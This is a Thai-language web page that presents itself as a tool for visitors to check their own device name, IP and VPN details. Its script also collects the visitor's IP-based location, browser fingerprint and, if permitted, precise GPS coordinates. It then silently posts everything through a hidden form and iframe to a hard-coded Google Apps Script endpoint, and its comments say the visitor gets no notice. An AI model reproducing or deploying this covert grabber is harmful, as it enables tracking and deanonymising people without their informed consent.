<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>ตรวจสอบข้อมูลเครื่อง</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Tahoma, sans-serif;
      background: linear-gradient(135deg, #020617, #111827, #1e293b);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 18px;
    }

    .box {
      width: 100%;
      max-width: 900px;
      background: #0f172a;
      padding: 28px;
      border-radius: 24px;
      box-shadow: 0 18px 45px rgba(0, 0, 0, 0.55);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    h1 {
      margin: 0 0 12px;
      text-align: center;
      font-size: 34px;
      line-height: 1.25;
      color: #ffffff;
    }

    .desc {
      color: #cbd5e1;
      text-align: center;
      line-height: 1.7;
      margin-bottom: 22px;
      font-size: 20px;
    }

    button {
      width: 100%;
      padding: 22px;
      font-size: 28px;
      border: none;
      border-radius: 18px;
      background: #22c55e;
      color: white;
      cursor: pointer;
      font-weight: bold;
      transition: 0.2s;
      box-shadow: 0 12px 25px rgba(34, 197, 94, 0.28);
    }

    button:hover {
      background: #16a34a;
    }

    button:disabled {
      background: #64748b;
      cursor: not-allowed;
      box-shadow: none;
    }

    .result {
      margin-top: 24px;
      background: #020617;
      padding: 24px;
      border-radius: 18px;
      white-space: pre-wrap;
      line-height: 1.7;
      overflow-x: auto;
      min-height: 240px;
      font-size: 28px;
      font-weight: bold;
      color: #f8fafc;
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    .map-link {
      color: #38bdf8;
      word-break: break-all;
    }

    .small {
      margin-top: 14px;
      font-size: 15px;
      color: #94a3b8;
      line-height: 1.6;
      text-align: center;
    }

    @media (max-width: 600px) {
      .box {
        padding: 20px;
        border-radius: 18px;
      }

      h1 {
        font-size: 28px;
      }

      .desc {
        font-size: 17px;
      }

      button {
        font-size: 23px;
        padding: 20px;
      }

      .result {
        font-size: 23px;
        padding: 18px;
      }
    }
  </style>
</head>

<body>

<div class="box">
  <h1>ตรวจสอบข้อมูลเครื่อง</h1>

  <div class="desc">
    กดปุ่มเพื่อดึงชื่อเครื่อง และข้อมูล IP / VPN
  </div>

  <button id="btn" onclick="sendLocation()">
    กดเพื่อตรวจสอบ
  </button>

  <div class="small">
    หมายเหตุ: GPS จริงของเครื่อง ต้องได้รับอนุญาตจากผู้ใช้ก่อนเท่านั้น ถ้าไม่อนุญาต ระบบจะใช้ตำแหน่งจาก IP แทน
  </div>

  <div id="result" class="result">ยังไม่มีข้อมูล</div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzvu4JqhFIihrd3PfvmF98wUUgJF2MRr99Qi--bZ-0NP5NKrl-BuW5q0VLVu4LjHI10Mw/exec";

const btn = document.getElementById("btn");
const result = document.getElementById("result");

function val(v) {
  if (v === null || v === undefined || v === "") return "-";
  return v;
}

function getDeviceName() {
  const ua = navigator.userAgent;

  if (/iPhone/i.test(ua)) return "iPhone";
  if (/iPad/i.test(ua)) return "iPad";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";

  return "Unknown Device";
}

function getBrowserName() {
  const ua = navigator.userAgent;

  if (ua.includes("Edg")) return "Microsoft Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  if (ua.includes("Chrome") && !ua.includes("CriOS")) return "Google Chrome";
  if (ua.includes("CriOS")) return "Chrome iOS";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari")) return "Safari";

  return "Unknown Browser";
}

function getBrowserTimezone() {
  try {
    return Intl.DateTimeFormat().resolvedOptions().timeZone || "";
  } catch {
    return "";
  }
}

async function fetchJson(url) {
  const res = await fetch(url, {
    cache: "no-store"
  });

  if (!res.ok) {
    throw new Error("HTTP " + res.status);
  }

  return await res.json();
}

function base64UrlEncode(str) {
  const utf8 = unescape(encodeURIComponent(str));
  const base64 = btoa(utf8);

  return base64
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/g, "");
}

function getCountryFullName(countryName, countryCode) {
  const code = String(countryCode || "").toUpperCase();
  const name = String(countryName || "").trim();

  const countryMap = {
    TH: "ประเทศไทย",
    SG: "สิงคโปร์",
    LA: "ลาว",
    KH: "กัมพูชา",
    MM: "เมียนมา",
    VN: "เวียดนาม",
    MY: "มาเลเซีย",
    ID: "อินโดนีเซีย",
    PH: "ฟิลิปปินส์",
    CN: "จีน",
    HK: "ฮ่องกง",
    TW: "ไต้หวัน",
    JP: "ญี่ปุ่น",
    KR: "เกาหลีใต้",
    US: "สหรัฐอเมริกา",
    GB: "สหราชอาณาจักร",
    AU: "ออสเตรเลีย",
    IN: "อินเดีย",
    RU: "รัสเซีย",
    DE: "เยอรมนี",
    FR: "ฝรั่งเศส",
    CA: "แคนาดา"
  };

  if (countryMap[code]) {
    return countryMap[code];
  }

  if (name === "Thailand" || name === "Thai" || name === "ไทย") {
    return "ประเทศไทย";
  }

  if (name === "Singapore") {
    return "สิงคโปร์";
  }

  return name || "-";
}

async function getIPInfo() {
  const apis = [
    {
      name: "ipapi.co",
      url: "https://ipapi.co/json/",
      map: function (d) {
        return {
          source_api: "ipapi.co",
          ip: d.ip || "",
          country_name: d.country_name || "",
          country_code: d.country_code || d.country || "",
          latitude: d.latitude || "",
          longitude: d.longitude || "",
          org: d.org || "",
          timezone: d.timezone || ""
        };
      }
    },
    {
      name: "ipwho.is",
      url: "https://ipwho.is/",
      map: function (d) {
        if (d.success === false) {
          throw new Error(d.message || "ipwho.is failed");
        }

        return {
          source_api: "ipwho.is",
          ip: d.ip || "",
          country_name: d.country || "",
          country_code: d.country_code || "",
          latitude: d.latitude || "",
          longitude: d.longitude || "",
          org: d.connection && d.connection.org ? d.connection.org : "",
          timezone: d.timezone && d.timezone.id ? d.timezone.id : ""
        };
      }
    },
    {
      name: "ipinfo.io",
      url: "https://ipinfo.io/json",
      map: function (d) {
        let lat = "";
        let lon = "";

        if (d.loc && d.loc.includes(",")) {
          const parts = d.loc.split(",");
          lat = parts[0] || "";
          lon = parts[1] || "";
        }

        return {
          source_api: "ipinfo.io",
          ip: d.ip || "",
          country_name: d.country || "",
          country_code: d.country || "",
          latitude: lat,
          longitude: lon,
          org: d.org || "",
          timezone: d.timezone || ""
        };
      }
    },
    {
      name: "geojs.io",
      url: "https://get.geojs.io/v1/ip/geo.json",
      map: function (d) {
        return {
          source_api: "geojs.io",
          ip: d.ip || "",
          country_name: d.country || "",
          country_code: d.country_code || "",
          latitude: d.latitude || "",
          longitude: d.longitude || "",
          org: d.organization_name || "",
          timezone: d.timezone || ""
        };
      }
    },
    {
      name: "api.ipify.org",
      url: "https://api.ipify.org?format=json",
      map: function (d) {
        return {
          source_api: "api.ipify.org",
          ip: d.ip || "",
          country_name: "",
          country_code: "",
          latitude: "",
          longitude: "",
          org: "",
          timezone: ""
        };
      }
    }
  ];

  for (const api of apis) {
    try {
      const raw = await fetchJson(api.url);
      return api.map(raw);
    } catch (e) {
      console.warn(api.name + " error:", e);
    }
  }

  return {
    source_api: "",
    ip: "",
    country_name: "",
    country_code: "",
    latitude: "",
    longitude: "",
    org: "",
    timezone: "",
    error: "ดึงข้อมูล IP ไม่สำเร็จทุก API"
  };
}

function normalizeIP(ip) {
  return {
    ip: ip.ip || "",
    country_name: ip.country_name || ip.country || "",
    country_code: ip.country_code || "",
    latitude: ip.latitude || ip.lat || "",
    longitude: ip.longitude || ip.lon || "",
    org: ip.org || "",
    timezone: ip.timezone || "",
    source_api: ip.source_api || "",
    error: ip.error || ""
  };
}

/*
  GPS จริงของเครื่อง
  ถ้าผู้ใช้ไม่อนุญาต จะไม่สามารถบังคับได้
*/
async function getGPSOptional() {
  if (!navigator.geolocation) {
    return {
      allowed: false,
      latitude: "",
      longitude: "",
      accuracy: "",
      error: "เบราว์เซอร์นี้ไม่รองรับ GPS"
    };
  }

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    });

    return {
      allowed: true,
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      error: ""
    };

  } catch (err) {
    let msg = "ไม่สามารถดึง GPS ได้";

    if (err.code === 1) {
      msg = "ผู้ใช้ไม่อนุญาต GPS";
    } else if (err.code === 2) {
      msg = "ไม่พบตำแหน่งของเครื่อง";
    } else if (err.code === 3) {
      msg = "ดึง GPS นานเกินไป หมดเวลา";
    }

    return {
      allowed: false,
      latitude: "",
      longitude: "",
      accuracy: "",
      error: msg
    };
  }
}

/*
  ส่งข้อมูลไป Admin แบบเงียบ ๆ
  ไม่ alert ฝั่งผู้กด
*/
async function postToAdmin(payload) {
  return new Promise((resolve) => {
    const iframeName = "hidden_iframe_" + Date.now();

    const iframe = document.createElement("iframe");
    iframe.name = iframeName;
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    const form = document.createElement("form");
    form.method = "POST";
    form.action = SCRIPT_URL;
    form.target = iframeName;
    form.style.display = "none";

    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "payload";
    input.value = base64UrlEncode(JSON.stringify(payload));

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();

    setTimeout(() => {
      form.remove();
      iframe.remove();

      resolve({
        ok: true,
        message: "sent"
      });
    }, 1800);
  });
}

function renderResult(payload) {
  let html = "";

  html += `1 ชื่อเครื่อง\n`;
  html += `ชื่อเครื่อง: ${val(payload.device_name)}\n\n`;

  html += `====== ข้อมูล IP / VPN ======\n`;
  html += `ประเทศ: ${val(payload.ip_country)}\n`;
  html += `IP: ${val(payload.ip)}\n`;
  html += `Google Maps IP:\n`;
  html += `${val(payload.ip_google_maps)}\n`;

  /*
    ถ้า GPS อนุญาตเท่านั้น ค่อยแสดง GPS จริง
    ถ้าไม่อนุญาต จะไม่แสดง Latitude: - Longitude: -
  */
  if (payload.gps_allowed && payload.gps_google_maps !== "-") {
    html += `\n====== ตำแหน่ง GPS จากเครื่อง ======\n`;
    html += `Google Maps GPS:\n`;
    html += `${payload.gps_google_maps}\n`;
    html += `ความแม่นยำ: ${payload.gps_accuracy || "-"}\n`;
  }

  result.textContent = html;
}

async function sendLocation() {
  btn.disabled = true;
  btn.textContent = "กำลังตรวจสอบ...";

  result.textContent = "กำลังดึงข้อมูล...";

  const deviceName = getDeviceName();

  const rawIP = await getIPInfo();
  const ip = normalizeIP(rawIP);

  const countryFullName = getCountryFullName(
    ip.country_name,
    ip.country_code
  );

  const ipGoogleMaps =
    ip.latitude && ip.longitude
      ? `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`
      : "-";

  /*
    ขอ GPS แบบ optional
    ถ้าผู้ใช้ไม่อนุญาต จะไม่แสดง - ให้รก
    และใช้ตำแหน่งจาก IP แทน
  */
  const gps = await getGPSOptional();

  const gpsGoogleMaps =
    gps.latitude && gps.longitude
      ? `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`
      : "-";

  const payload = {
    device_name: deviceName,
    browser: getBrowserName(),
    platform: navigator.platform || "",
    user_agent: navigator.userAgent || "",
    language: navigator.language || "",
    screen: `${screen.width}x${screen.height}`,
    timezone_browser: getBrowserTimezone(),

    ip: ip.ip || "",
    ip_country: countryFullName,
    ip_country_code: ip.country_code || "",
    ip_latitude: ip.latitude || "",
    ip_longitude: ip.longitude || "",
    ip_google_maps: ipGoogleMaps,
    ip_org: ip.org || "",
    ip_timezone: ip.timezone || "",
    ip_source_api: ip.source_api || "",
    ip_error: ip.error || "",

    gps_allowed: gps.allowed,
    gps_latitude: gps.latitude || "",
    gps_longitude: gps.longitude || "",
    gps_accuracy: gps.accuracy ? gps.accuracy + " เมตร" : "",
    gps_google_maps: gpsGoogleMaps,
    gps_error: gps.error || "",

    sent_at: new Date().toLocaleString("th-TH")
  };

  renderResult(payload);

  /*
    ส่งไป Admin แบบเงียบ ๆ
    ไม่แสดงข้อความว่าส่งแล้ว
    ไม่ alert
  */
  try {
    await postToAdmin(payload);
  } catch (err) {
    console.warn("ส่งข้อมูลไม่สำเร็จ:", err);
  }

  btn.disabled = false;
  btn.textContent = "กดเพื่อตรวจสอบ";
}
</script>

</body>
</html>
